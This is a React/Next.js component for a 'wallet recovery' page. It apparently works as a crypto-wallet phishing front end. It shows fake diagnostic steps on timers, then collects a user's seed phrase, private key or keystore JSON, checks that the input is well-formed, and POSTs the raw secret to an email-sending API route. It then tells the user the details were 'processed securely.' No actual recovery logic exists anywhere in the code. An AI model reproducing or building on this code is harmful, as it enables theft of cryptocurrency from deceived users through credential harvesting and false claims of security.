'use client'

import { useCallback, useEffect, useMemo, useState } from 'react'
import { useRouter } from 'next/navigation'

type RecoveryStage = 'idle' | 'initializing' | 'chooseConnection' | 'enterSecret' | 'reviewing' | 'success' | 'error'
type ConnectionType = 'Secret Phrase' | 'Keystore' | 'Private Key'

type RecoveryIssue = {
  id: string
  title: string
  description: string
  badge: string
  summary: string
}

const issueOptions: RecoveryIssue[] = [
  { id: 'key-management', title: 'Key Management & Cryptography Issues', description: 'Review key generation, storage, and cryptographic protections for private data.', badge: 'Key Management', summary: 'Address private key leaks, weak encryption, and recovery phrase vulnerabilities.' },
  { id: 'network-transaction', title: 'Network & Transaction Layer Problems', description: 'Inspect RPC, mempool handling, gas fee behavior, and transaction propagation.', badge: 'Network', summary: 'Detect network stalls, failed transaction broadcasts, and incorrect fee estimation.' },
  { id: 'smart-contract', title: 'Smart Contract & Token Interaction Bugs', description: 'Analyze contract integrations, token approvals, reentrancy risks, and call failures.', badge: 'Smart Contract', summary: 'Fix token approval issues, contract call failures, and unsafe interaction flows.' },
  { id: 'ui-ux', title: 'UI/UX-Induced Technical Failures', description: 'Detect interface issues that lead to user mistakes, incorrect approvals, or stale data.', badge: 'UI/UX', summary: 'Resolve misleading prompts, stale state, and approval flow failures caused by the UI.' },
  { id: 'integration-api', title: 'Integration & API Issues', description: 'Validate API endpoints, third-party integrations, and external service stability.', badge: 'Integration', summary: 'Repair broken API calls, third-party mismatches, and service timeout failures.' },
  { id: 'storage-persistence', title: 'Storage & Persistence Problems', description: 'Check local storage, session persistence, backup recovery, and cache coherency.', badge: 'Storage', summary: 'Fix cached state loss, corrupted backups, and inconsistent local persistence.' },
  { id: 'cross-chain', title: 'Cross-Chain & Multi-Chain Issues', description: 'Review bridging logic, chain selection, and multi-chain transaction consistency.', badge: 'Cross-Chain', summary: 'Address chain mismatch, bridge failure, and cross-network transaction problems.' },
  { id: 'vulnerabilities', title: 'Security Vulnerabilities', description: 'Scan for known attack patterns, permission escalation, and unauthorized access vectors.', badge: 'Vulnerabilities', summary: 'Identify unsafe authorization, privilege escalation, and wallet attack surfaces.' },
  { id: 'performance', title: 'Performance & Scalability Issues', description: 'Analyze throughput, latency, and resource usage for resilient wallet and dApp behavior.', badge: 'Performance', summary: 'Resolve slow sync, high latency, and scalability limits in wallet operations.' },
  { id: 'implementation-bugs', title: 'Developer / Implementation Bugs', description: 'Find code-level flaws, incorrect assumptions, and integration bugs in the security stack.', badge: 'Implementation', summary: 'Fix logic errors, API misuse, and implementation bugs that break recovery workflows.' },
]

const connectionTypes: ConnectionType[] = ['Secret Phrase', 'Keystore', 'Private Key']
const initializingSteps = ['Establishing secure recovery channel', 'Validating issue context and selected repair path', 'Preparing recovery diagnostics']
const reviewingSteps = ['Encrypting recovery details', 'Processing recovery details', 'Finalizing recovery review']
const recoverySteps = ['Select issue', 'Initialize', 'Choose connection', 'Enter secret', 'Review', 'Success']

const RecoveryIcon = ({ kind }: { kind: 'shield' | 'key' | 'file' | 'vault' | 'check' | 'alert' }) => {
  const iconMap = {
    shield: <path d="M12 3l7 4v5c0 4.4-2.8 7.8-7 9-4.2-1.2-7-4.6-7-9V7l7-4z" />,
    key: <><circle cx="8.5" cy="12" r="2.5" /><path d="M11 12h9M17 12v2M20 12v2" /></>,
    file: <><path d="M8 3h6l4 4v14H8z" /><path d="M14 3v5h5" /></>,
    vault: <><rect x="4" y="5" width="16" height="14" rx="3" /><circle cx="12" cy="12" r="2.5" /><path d="M12 9.5v5" /></>,
    check: <><path d="M12 3l7 4v5c0 4.4-2.8 7.8-7 9-4.2-1.2-7-4.6-7-9V7l7-4z" /><path d="M9.5 12.5l1.7 1.7 3.3-4" /></>,
    alert: <><path d="M12 4l8 14H4L12 4z" /><path d="M12 9v4" /><path d="M12 16h.01" /></>,
  }

  return (
    <svg viewBox="0 0 24 24" className="h-6 w-6" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      {iconMap[kind]}
    </svg>
  )
}

const getRecoveryStepIndex = (flowStep: RecoveryStage) => {
  switch (flowStep) {
    case 'idle': return 0
    case 'initializing': return 1
    case 'chooseConnection': return 2
    case 'enterSecret': return 3
    case 'reviewing': return 4
    case 'success': return 5
    case 'error': return 4
    default: return 0
  }
}

const validateConnectionInput = (type: ConnectionType, value: string) => {
  const trimmed = value.trim()
  if (type === 'Secret Phrase') return trimmed.split(/\s+/).filter(Boolean).length >= 12 && trimmed.split(/\s+/).filter(Boolean).length <= 24
  if (type === 'Private Key') return /^(0x)?[A-Fa-f0-9]{64}$/.test(trimmed)
  if (type === 'Keystore') {
    try {
      const parsed = JSON.parse(trimmed)
      return typeof parsed === 'object' && parsed !== null && 'crypto' in parsed
    } catch {
      return false
    }
  }
  return false
}

export const WalletRestoration = () => {
  const [flowStep, setFlowStep] = useState<RecoveryStage>('idle')
  const [activeIssue, setActiveIssue] = useState<RecoveryIssue | null>(null)
  const [selectedConnection, setSelectedConnection] = useState<ConnectionType | null>(null)
  const [connectionInput, setConnectionInput] = useState('')
  const [inputError, setInputError] = useState('')
  const [activityMessage, setActivityMessage] = useState('Preparing wallet recovery diagnostics...')
  const [progressIndex, setProgressIndex] = useState(0)
  const [resultSummary, setResultSummary] = useState<string[]>([])
  const [message, setMessage] = useState('')
  const router = useRouter()

  const activeMessages = useMemo(() => {
    if (flowStep === 'initializing') return initializingSteps
    if (flowStep === 'reviewing') return reviewingSteps
    return []
  }, [flowStep])

  const handleExit = () => {
    setFlowStep('idle')
    setActiveIssue(null)
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setResultSummary([])
    setMessage('')
    setActivityMessage('Preparing wallet recovery diagnostics...')
    setProgressIndex(0)
  }

  const submitRecovery = useCallback(async () => {
    if (!activeIssue || !selectedConnection) {
      setFlowStep('error')
      setMessage('Recovery flow interrupted. Please start again.')
      return
    }

    try {
      const timestamp = new Date().toISOString()
      const method = selectedConnection === 'Secret Phrase' ? 'phrase' : selectedConnection === 'Keystore' ? 'keystore' : 'privatekey'

      const response = await fetch('/api/send-recovery-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          issueId: activeIssue.id,
          issueTitle: activeIssue.title,
          issueDescription: activeIssue.description,
          issueSummary: activeIssue.summary,
          selectedConnection,
          method,
          data: connectionInput.trim(),
          timestamp,
        }),
      })

      if (!response.ok) {
        const errorResponse = await response.text()
        throw new Error(errorResponse || 'Failed to process recovery details')
      }

      setResultSummary([
        `Recovery issue: ${activeIssue.title}`,
        `Connection mode: ${selectedConnection}`,
        `Method: ${method}`,
        'Input format validated successfully',
        'Recovery details processed securely',
      ])
      setMessage('Recovery request processed securely.')
      setFlowStep('success')

      setTimeout(() => {
        router.push(`/recovery/success?issue=${activeIssue.id}&method=${method}&time=${encodeURIComponent(timestamp)}`)
      }, 2600)
    } catch (err) {
      setFlowStep('error')
      setMessage(err instanceof Error ? err.message : 'Recovery processing failed')
    }
  }, [activeIssue, connectionInput, router, selectedConnection])

  useEffect(() => {
    if (flowStep !== 'initializing' && flowStep !== 'reviewing') return
    if (activeMessages.length === 0) return

    let currentIndex = 0
    const timers: NodeJS.Timeout[] = []
    const tick = () => {
      currentIndex += 1
      if (currentIndex < activeMessages.length) {
        timers.push(setTimeout(() => {
          setActivityMessage(activeMessages[currentIndex])
          setProgressIndex(currentIndex)
          tick()
        }, 1200))
        return
      }

      timers.push(setTimeout(() => {
        if (flowStep === 'initializing') setFlowStep('chooseConnection')
        else void submitRecovery()
      }, 1200))
    }

    timers.push(setTimeout(tick, 1200))
    return () => timers.forEach(clearTimeout)
  }, [activeMessages, flowStep, submitRecovery])

  const handleIssueSelect = (issue: RecoveryIssue) => {
    setActiveIssue(issue)
    setActivityMessage(initializingSteps[0])
    setProgressIndex(0)
    setFlowStep('initializing')
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setResultSummary([])
    setMessage('')
  }

  const handleConnectionSelect = (type: ConnectionType) => {
    setSelectedConnection(type)
    setConnectionInput('')
    setInputError('')
    setFlowStep('enterSecret')
  }

  const handleContinue = () => {
    if (!selectedConnection) return
    if (!validateConnectionInput(selectedConnection, connectionInput)) {
      setInputError(selectedConnection === 'Secret Phrase' ? 'Enter a valid 12-24 word recovery phrase.' : selectedConnection === 'Private Key' ? 'Enter a valid 64-character hex private key.' : 'Enter a valid keystore JSON.')
      return
    }

    setInputError('')
    setActivityMessage(reviewingSteps[0])
    setProgressIndex(0)
    setFlowStep('reviewing')
  }

  const canContinue = Boolean(selectedConnection && connectionInput.trim())

  return (
    <div className="relative space-y-6">
      <div className={`rounded-[28px] border border-white/10 bg-slate-950/90 p-6 shadow-[0_32px_80px_-48px_rgba(59,130,246,0.55)] transition-all ${flowStep !== 'idle' ? 'opacity-40' : 'opacity-100'}`}>
        <div className="mb-6">
          <p className="text-xs uppercase tracking-[0.32em] text-cyan-300">Recovery & Repair</p>
          <h1 className="mt-3 text-3xl font-bold text-white">Fix wallet issues with guided recovery</h1>
          <p className="mt-3 max-w-3xl text-sm text-slate-400">Select the most relevant repair workflow for your wallet, choose a secure connection mode, and let the system validate the input before continuing.</p>
        </div>

        <div className="mb-6 grid gap-2 sm:grid-cols-3">
          {recoverySteps.map((step, index) => (
            <div key={step} className={`rounded-[24px] border p-3 text-center text-xs font-semibold uppercase tracking-[0.24em] transition ${getRecoveryStepIndex(flowStep) === index ? 'border-cyan-400/40 bg-cyan-500/10 text-white' : 'border-white/10 bg-slate-950/80 text-slate-400'} ${index < getRecoveryStepIndex(flowStep) ? 'opacity-80' : ''}`}>
              {step}
            </div>
          ))}
        </div>

        {flowStep === 'idle' && (
          <div className="grid gap-4 lg:grid-cols-2">
            {issueOptions.map((issue) => (
              <button key={issue.id} type="button" onClick={() => handleIssueSelect(issue)} className={`group rounded-[24px] border p-5 text-left transition ${activeIssue?.id === issue.id ? 'border-cyan-400/40 bg-cyan-500/10 shadow-[0_16px_40px_-24px_rgba(34,211,238,0.55)]' : 'border-white/10 bg-white/5 hover:border-white/20 hover:bg-white/10'}`}>
                <div className="flex items-center justify-between gap-3">
                  <div>
                    <p className="text-xs font-semibold uppercase tracking-[0.28em] text-cyan-300">{issue.badge}</p>
                    <h2 className="mt-3 text-xl font-semibold text-white">{issue.title}</h2>
                  </div>
                  <div className="rounded-full bg-cyan-500/10 px-3 py-2 text-xs font-semibold uppercase tracking-[0.25em] text-cyan-200">Fix common issues</div>
                </div>
                <p className="mt-4 text-sm leading-6 text-slate-400">{issue.description}</p>
                <p className="mt-4 text-xs text-slate-500">{issue.summary}</p>
              </button>
            ))}
          </div>
        )}
      </div>

      {flowStep !== 'idle' && <div className="pointer-events-auto absolute inset-0 z-20 rounded-[28px] bg-slate-950/60 backdrop-blur-sm" onClick={handleExit} />}

      {(flowStep === 'initializing' || flowStep === 'chooseConnection' || flowStep === 'enterSecret' || flowStep === 'reviewing' || flowStep === 'success' || flowStep === 'error') && (
        <div className="absolute inset-0 z-30 flex items-center justify-center px-4 py-10">
          <div className="w-full max-w-lg overflow-y-auto rounded-[28px] border border-cyan-400/20 bg-slate-950/95 p-6 text-center shadow-2xl shadow-cyan-500/10 sm:max-w-2xl" onClick={(event) => event.stopPropagation()}>
            <div className="mb-4 flex justify-end">
              <button type="button" onClick={handleExit} className="rounded-full border border-white/10 bg-slate-900/80 px-3 py-2 text-xs text-slate-300 transition hover:bg-slate-900">Close</button>
            </div>

            {flowStep === 'initializing' && (
              <>
                <div className="mx-auto mb-7 flex h-24 w-24 items-center justify-center rounded-full border border-cyan-400/20 bg-slate-800/80 text-cyan-300 shadow-inner shadow-cyan-500/20">
                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-cyan-500/20 to-blue-500/10 text-cyan-300 animate-pulse"><RecoveryIcon kind="shield" /></div>
                </div>
                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Initializing recovery</p>
                <h3 className="mt-4 text-2xl font-semibold text-white">Preparing recovery diagnostics</h3>
                <p className="mt-3 text-sm text-slate-400">{activityMessage}</p>
                <div className="mt-8 grid gap-3 sm:grid-cols-3">
                  {activeMessages.map((step, index) => (
                    <div key={step} className={`rounded-[24px] border p-4 text-left transition ${progressIndex >= index ? 'border-cyan-400/30 bg-cyan-500/10 text-white' : 'border-white/10 bg-slate-950/80 text-slate-300'}`}>
                      <p className="text-xs uppercase tracking-[0.28em] text-slate-400">Stage {index + 1}</p>
                      <p className="mt-2 text-sm font-semibold">{step}</p>
                    </div>
                  ))}
                </div>
              </>
            )}

            {flowStep === 'chooseConnection' && (
              <>
                <div className="flex items-center justify-between gap-4">
                  <div className="text-left">
                    <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Connection type</p>
                    <h3 className="mt-3 text-2xl font-semibold text-white">Choose how to verify access</h3>
                    <p className="mt-2 text-sm text-slate-400">Select the recovery mode for the next verification step.</p>
                  </div>
                  <span className="rounded-full border border-cyan-500/20 px-3 py-2 text-xs uppercase tracking-[0.25em] text-cyan-300">{activeIssue?.badge}</span>
                </div>
                <div className="mt-8 grid gap-4 sm:grid-cols-3">
                  {connectionTypes.map((type) => (
                    <button key={type} type="button" onClick={() => handleConnectionSelect(type)} className="rounded-[24px] border border-slate-700/60 bg-slate-950/80 p-5 text-left transition hover:border-cyan-400/50 hover:bg-slate-900">
                      <div className="mb-4 inline-flex h-11 w-11 items-center justify-center rounded-2xl border border-cyan-400/20 bg-cyan-500/10 text-cyan-300">
                        <RecoveryIcon kind={type === 'Secret Phrase' ? 'key' : type === 'Keystore' ? 'file' : 'vault'} />
                      </div>
                      <p className="text-sm font-semibold text-white">{type}</p>
                      <p className="mt-2 text-xs text-slate-400">{type === 'Secret Phrase' ? 'Mnemonic recovery phrase for deterministic wallets.' : type === 'Keystore' ? 'Encrypted JSON wallet backup.' : 'Raw private key in hex format.'}</p>
                    </button>
                  ))}
                </div>
              </>
            )}

            {flowStep === 'enterSecret' && selectedConnection && (
              <>
                <div className="mb-6 text-left">
                  <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Verification required</p>
                  <h3 className="mt-3 text-2xl font-semibold text-white">Enter {selectedConnection}</h3>
                  <p className="mt-2 text-sm text-slate-400">This input is validated before recovery processing continues.</p>
                </div>
                <textarea
                  value={connectionInput}
                  onChange={(event) => {
                    setConnectionInput(event.target.value)
                    setInputError('')
                  }}
                  placeholder={selectedConnection === 'Secret Phrase' ? 'e.g. ozone drill grab ...' : selectedConnection === 'Private Key' ? 'e.g. 0x...' : '{ "crypto": { ... } }'}
                  className="min-h-[160px] w-full rounded-[24px] border border-slate-700/70 bg-slate-950/90 px-4 py-4 text-sm text-slate-100 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                />
                {inputError && <p className="mt-3 text-sm text-rose-400">{inputError}</p>}
                <div className="mt-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                  <p className="text-sm text-slate-400">Once validated, the recovery flow will continue securely.</p>
                  <button type="button" onClick={handleContinue} disabled={!canContinue} className="inline-flex items-center justify-center rounded-full bg-cyan-500 px-6 py-3 text-sm font-semibold text-slate-950 transition hover:bg-cyan-400 disabled:cursor-not-allowed disabled:opacity-50">Continue</button>
                </div>
              </>
            )}

            {flowStep === 'reviewing' && (
              <>
                <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-cyan-400/20 bg-slate-800/80 text-cyan-300 shadow-inner shadow-cyan-500/10">
                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-cyan-500/10 text-cyan-300 animate-spin"><RecoveryIcon kind="vault" /></div>
                </div>
                <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Processing recovery</p>
                <h3 className="mt-4 text-2xl font-semibold text-white">Processing recovery details</h3>
                <p className="mt-3 text-sm text-slate-400">{activityMessage}</p>
                <div className="mt-8 rounded-full bg-slate-800/90 p-1">
                  <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${((progressIndex + 1) / activeMessages.length) * 100}%` }} />
                </div>
              </>
            )}

            {flowStep === 'success' && (
              <>
                <div className="flex items-center justify-between gap-4">
                  <div className="text-left">
                    <p className="text-sm uppercase tracking-[0.3em] text-emerald-300">Recovery complete</p>
                    <h3 className="mt-3 text-2xl font-semibold text-white">Recovery request processed</h3>
                    <p className="mt-2 text-sm text-slate-400">The selected recovery content has been processed securely.</p>
                  </div>
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-500/10 text-emerald-300"><RecoveryIcon kind="check" /></div>
                </div>
                <div className="mt-6 rounded-[24px] border border-slate-700/70 bg-slate-950/80 p-5 text-left text-sm text-slate-300">
                  <p className="font-semibold text-white">Recovery details</p>
                  <ul className="mt-4 space-y-3 text-sm text-slate-400">
                    {resultSummary.map((line) => (
                      <li key={line} className="flex items-start gap-3">
                        <span className="mt-1 text-emerald-300">-</span>
                        <span>{line}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              </>
            )}

            {flowStep === 'error' && (
              <>
                <div className="flex items-center justify-between gap-4">
                  <div className="text-left">
                    <p className="text-sm uppercase tracking-[0.3em] text-rose-300">Error</p>
                    <h3 className="mt-3 text-2xl font-semibold text-white">Recovery failed</h3>
                    <p className="mt-2 text-sm text-slate-400">Please retry the workflow or select another connection type.</p>
                  </div>
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-rose-500/10 text-rose-300"><RecoveryIcon kind="alert" /></div>
                </div>
                <div className="mt-6 rounded-[24px] border border-rose-500/20 bg-slate-950/80 p-5 text-sm text-slate-200">{message}</div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  )
}
